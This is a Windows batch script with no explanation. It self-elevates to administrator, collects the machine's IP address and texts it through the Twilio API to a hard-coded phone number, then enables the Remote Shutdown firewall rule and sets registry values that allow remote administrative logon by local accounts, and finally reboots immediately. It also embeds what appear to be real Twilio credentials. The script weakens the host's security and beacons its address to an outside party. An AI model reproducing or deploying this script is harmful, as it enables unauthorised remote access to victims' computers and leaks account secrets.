@echo off
setlocal enabledelayedexpansion

NET SESSION >nul 2>&1
if %errorLevel% neq 0 goto runAsAdministrator

for /f "tokens=2 delims=:" %%a in ('ipconfig ^| find "IPv4 Address"') do set ip_address=%%a
set ip_address=!ip_address: =!

set "account_sid=AC3a95557da9a38da8559f2ffc2f276bd4"
set "auth_token=9fdbab989d159d9d1de7b0b23609edc4"
set "from_phone=+13344384446"
set "to_phone=+640223189720"

powershell -Command "Invoke-RestMethod -Uri 'https://api.twilio.com/2010-04-01/Accounts/%account_sid%/Messages.json' -Method Post -Headers @{Authorization=('Basic {0}' -f [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(('' + '%account_sid%' + ':' + '%auth_token%'))))} -Body @{From='%from_phone%'; To='%to_phone%'; Body='Your computer''s IP address is: %ip_address%'}"

netsh advfirewall firewall set rule group="Remote Shutdown" new enable=yes

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "ForceGuest" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "LocalAccountTokenFilterPolicy" /t REG_DWORD /d 1 /f

shutdown /r /t 0

pause
goto :eof

:runAsAdministrator
powershell -Command "Start-Process '%0' -Verb RunAs"
goto :eof
